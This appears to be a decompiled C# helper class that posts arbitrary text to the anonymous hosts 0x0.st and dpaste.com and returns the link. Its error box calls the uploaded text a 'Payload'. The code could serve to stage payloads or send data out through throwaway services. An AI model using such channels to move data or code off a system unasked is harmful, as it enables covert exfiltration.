using System;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

public class Internet_Stuff
{
  private static string Upload_0x0(string textToUpload)
  {
    try
    {
      string requestUri = "https://0x0.st";
      int num = 720;
      using (HttpClient httpClient = new HttpClient())
      {
        MultipartFormDataContent content1 = new MultipartFormDataContent();
        ByteArrayContent content2 = new ByteArrayContent(Encoding.UTF8.GetBytes(textToUpload));
        content1.Add((HttpContent) content2, "file", "file.txt");
        if (num > 0)
          content1.Add((HttpContent) new StringContent(num.ToString()), "expires");
        HttpResponseMessage result = httpClient.PostAsync(requestUri, (HttpContent) content1).Result;
        if (result.IsSuccessStatusCode)
          return result.Content.ReadAsStringAsync().Result.Trim();
        throw new Exception(string.Format("Fehler beim Hochladen: {0}", (object) result.StatusCode));
      }
    }
    catch
    {
      return (string) null;
    }
  }

  private static string UploadContent(string textToUpload)
  {
    try
    {
      string requestUri = "https://dpaste.com/api/";
      using (HttpClient httpClient = new HttpClient())
      {
        MultipartFormDataContent content1 = new MultipartFormDataContent();
        StringContent content2 = new StringContent(textToUpload, Encoding.UTF8, "text/plain");
        content1.Add((HttpContent) content2, "content");
        StringContent content3 = new StringContent("python");
        content1.Add((HttpContent) content3, "syntax");
        StringContent content4 = new StringContent("30");
        content1.Add((HttpContent) content4, "expiry_days");
        HttpResponseMessage result = httpClient.PostAsync(requestUri, (HttpContent) content1).Result;
        if (result.IsSuccessStatusCode)
          return result.Content.ReadAsStringAsync().Result.Trim() + ".txt";
        throw new Exception(string.Format("Fehler beim Hochladen: {0}", (object) result.StatusCode));
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine("Eine Ausnahme ist aufgetreten: " + ex.Message);
      return (string) null;
    }
  }

  public static string Upload(string text)
  {
    string str1 = Internet_Stuff.Upload_0x0(text);
        if (str1 != null) {
            Console.WriteLine("Down 0x0");
                    return str1;
        }

        string str2 = Internet_Stuff.UploadContent(text);
        if (str2 != null)
        {
            Console.WriteLine("Down dpaste");
            return str2;
        }
    int num = (int) MessageBox.Show("Uploading Payload Failed, make sure you have an Internet connection and turn off stuff that could block connection to the server. Some VPNs sometimes block the connection. You can change your location or connect without", "Error");
    return (string) null;
  }
}
